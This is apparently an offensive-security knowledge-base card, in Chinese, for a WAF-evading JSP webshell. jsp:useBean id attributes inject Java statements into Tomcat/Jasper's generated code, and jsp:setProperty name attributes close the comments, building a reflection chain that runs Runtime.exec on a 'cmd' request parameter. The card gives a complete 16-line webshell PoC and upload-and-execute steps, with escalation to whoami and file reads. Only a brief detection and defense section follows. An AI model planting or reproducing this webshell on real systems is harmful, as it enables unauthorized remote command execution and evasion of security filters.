---
id: web-generic-file-upload-jsp-usebean-tag-reflection-injection
title: JSP jsp:useBean 标签注入：id 属性注入语句 + jsp:setProperty 闭合注释，纯标签反射链执行 Runtime.exec
type: scenario
domain: web
path: web/generic/file-upload
technique: jsp-usebean-tag-reflection-injection
tags:
- web
- file-upload
- jsp
- waf-bypass
- webshell
- reflection
- tag
- tomcat
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V486
  verified_at: '2026-11-10T21:44:29+08:00'
  notes: 已对照原文图23逐行核对 16 行 useBean/setProperty PoC（含 id 中的 \" 转义、setProperty name 的 \"*/ // 闭合注释、MethodUtil.invoke 反射链），卡内与幻灯片一致（超出画面右缘处已在卡内注明未逐字还原）；单动作（纯标签反射链），与 setProperty 逃逸卡互引且不重复；卡内无 sources/source_url/文章ID/URL，path 合法；原文未给受影响版本，已 --clear。未验证点：getDeclaredFields()[0]/getDeclaredMethods()[15] 与 MethodUtil 可用性依赖 JDK 版本且原文未标注，PoC 未在真实目标执行。
url: /docs/web/generic/file-upload/web-generic-file-upload-jsp-usebean-tag-reflection-injection/
draft: false
kb_aliases:
- 标签注入
- 无 scriptlet JSP 马
- useBean webshell
- jsp:useBean 注入
- MethodUtil.invoke 反射马
- JSP 标签反射链
---

## 一句话结论

整份 webshell 只由 `jsp:useBean`/`jsp:setProperty` 标准动作拼成：`jsp:useBean` 的 id 属性在生成代码里闭合引号并注入 Java 语句，`jsp:setProperty` 的 name 属性 `\"*/ //` 负责闭合上一条 `/*` 块注释并注释残余，依次完成 `Class.forName("java.lang.Runtime")` → 静态字段取 Runtime 单例 → `sun.reflect.misc.MethodUtil.invoke` 反射执行 `exec(request.getParameter("cmd"))` → 读流回显；文件中没有 `<%`，也没有 `Runtime.getRuntime().exec` 连续明文。

## 原理

Java 上传流量对抗的通用背景：WAF 按自身规则匹配上传内容，而 Tomcat/Jasper 把 JSP 标准动作在翻译期展开成 Java 源码再编译，真正执行的是生成代码而非上传原文。

- **id 属性注入**：Jasper 为 `<jsp:useBean id="X" ...>` 生成的代码里，`X` 既作变量名、又作字符串参数进入 `findAttribute("X")`/`setAttribute` 一类调用，且属性值嵌入生成源码时不转义裸引号。把 id 写成 `aa;aa=Class.forName(\"java.lang.Runtime\");/*`，`\"` 解析为裸引号终止生成代码中的字符串，`;` 结束语句执行赋值，`/*` 开启块注释吞掉该生成行剩余部分。
- **setProperty 闭合注释**：紧随其后的 `<jsp:setProperty name="\"*/ //" property="*"/>` 中，name 属性解析出的裸引号处于外层注释内部，`*/` 关闭上一行 `/*` 开启的块注释，`//` 注释掉本行残余生成代码——语法重新闭合，文件可编译。
- **反射链**：每对 useBean+setProperty 注入并注释一步——`Class.forName("java.lang.Runtime")` 得 Class → `getDeclaredFields()[0]` + `setAccessible(true)` + `get(null)` 取 Runtime 单例 → `getDeclaredMethods()[15]` + `setAccessible(true)` 取方法 → `MethodUtil.invoke(md, o, new Object[]{request.getParameter("cmd")})` 调用 exec → `getInputStream()` 交给 BufferedReader/StringBuilder 回显（幻灯片用 `?cmd=ls` 直接列出目录）。
- **为什么有效**：整份文件没有 `<%`、没有 `Runtime.getRuntime()` 连续文本，危险动作以“页面组件声明”的标签属性形式分散存放；只匹配 scriptlet/明文 exec 的规则漏判，真正执行依赖 Jasper 的翻译产物。

## 触发条件

- 目标允许上传/写入 .jsp 且容器会编译执行（Tomcat/Jasper 系）；
- Jasper 按上述方式把 useBean/setProperty 属性拼进生成代码（幻灯片在本地 Tomcat 复现，具体版本原文未标注）；
- 目标 JDK 存在 `sun.reflect.misc.MethodUtil` 且可反射访问 Runtime 私有成员；`getDeclaredFields()[0]`、`getDeclaredMethods()[15]` 的索引与 JDK 实现相关，需按目标实测调整（原文未给版本，勿硬编码）；
- 防护只做上传内容的静态文本特征匹配，不展开标签。

## 利用步骤

1. 按幻灯片构造只含标签的 index.jsp（见 PoC，8 对 useBean/setProperty）；
2. 上传到会被编译执行的目录，访问 `index.jsp?cmd=ls`（幻灯片回显了目录列表）；
3. 到容器 work 目录比对生成的 `index_jsp.java`，确认注入语句与注释闭合位置正确；
4. 按目标 JDK 调整字段/方法索引（`getDeclaredFields()[0]`、`getDeclaredMethods()[15]`），换成 `cmd=whoami`/读文件等扩大利用。

## PoC

幻灯片完整文件（按截图逐行整理；超出画面右缘的部分未逐字还原）：

```jsp
<jsp:useBean id="aa;aa=Class.forName(\"java.lang.Runtime\");/*" type="java.lang.Class" beanName="aa"></jsp:useBean>
<jsp:setProperty name="\"*/ //" property="*"></jsp:setProperty>
<jsp:useBean id="ct;ct = aa.getDeclaredFields()[0];/*" type="java.lang.reflect.Field" beanName="ct"></jsp:useBean>
<jsp:setProperty name="\"*/ //" property="*"></jsp:setProperty>
<jsp:useBean id="aaa;ct.setAccessible(true);/*" type="java.lang.String" beanName="aaa"></jsp:useBean>
<jsp:setProperty name="\"*/ //" property="*"></jsp:setProperty>
<jsp:useBean id="o;o = ct.get(null);/*" type="java.lang.Object" beanName="o"></jsp:useBean>
<jsp:setProperty name="\"*/ //" property="*"></jsp:setProperty>
<jsp:useBean id="md;md = aa.getDeclaredMethods()[15];/*" type="java.lang.reflect.Method" beanName="md"></jsp:useBean>
<jsp:setProperty name="\"*/ //" property="*"></jsp:setProperty>
<jsp:useBean id="bbb;md.setAccessible(true);/*" type="java.lang.reflect.Method" beanName="bbb"></jsp:useBean>
<jsp:setProperty name="\"*/ //" property="*"></jsp:setProperty>
<jsp:useBean id="in;in = ((Process) sun.reflect.misc.MethodUtil.invoke(md, o, new Object[]{request.getParameter("cmd")})).getInputStream();/*" type="java.io.InputStream" beanName="in"></jsp:useBean>
<jsp:setProperty name="\"*/ //" property="*"></jsp:setProperty>
<jsp:useBean id="sb;sb = new StringBuilder();java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(in)); ...读取并回显..." type="java.lang.StringBuilder" beanName="sb"></jsp:useBean>
<jsp:setProperty name="\"*/ //" property="*"></jsp:setProperty>
```

访问 `index.jsp?cmd=ls` 应回显命令输出。幻灯片在本地 Tomcat/JDK 环境验证；未在真实目标执行，字段/方法索引与 `MethodUtil` 可用性需按目标 JDK 实测。

## 变体与关联

- 变体：把 `MethodUtil.invoke` 换成直接反射调用（`md.invoke(o, ...)`）或 `ScriptEngineManager` 链路；与 EL 表达式拆词、JSPX 语法、文件编码手法叠加弱化特征。
- 关联：[[web-generic-file-upload-jsp-setproperty-attribute-quote-escape]]（同一“标签属性注入生成代码”原语的单语句版本，见本次拆分另一张卡）、[[web-java-expression-el-injection-waf-bypass-scanner-echo]]（EL 反射链，拆词思路同源）、[[web-generic-file-upload-jspx-xml-pi-entity-cdata-waf-bypass]]、[[web-java-rce-jsp-scriptlet-special-closure-bypass]]。
- 边界：整条链依赖 Jasper 属性拼接实现与 JDK 反射行为，容器/JDK 升级后需重调；链路长，语义/AST 检测与“标签展开后再匹配”的 WAF 可识别；最终仍需 JSP 编译执行。

## 检测与防御

- 检测（WAF）：拒绝含 `<jsp:useBean>`/`<jsp:setProperty>` 且 id/name 属性内出现分号、注释符、方法调用的 JSP；按 JSP 标准动作展开生成代码后匹配 `Runtime`、`MethodUtil.invoke`、`getRuntime` 等特征。
- 检测（主机）：生成的 `_jsp.java` 中出现 `Class.forName("java.lang.Runtime")`、`sun.reflect.misc.MethodUtil.invoke`、`getDeclaredMethods`；JSP 源文件出现 `id="...;` 或 `name="\"*/` 形态；Web 进程派生 cmd/sh 子进程。
- 防御：禁止上传目录执行 JSP；WAF 采用编译感知/语法树检测；业务 JSP 标签白名单审计；容器最小权限、禁止出网与子进程监控。
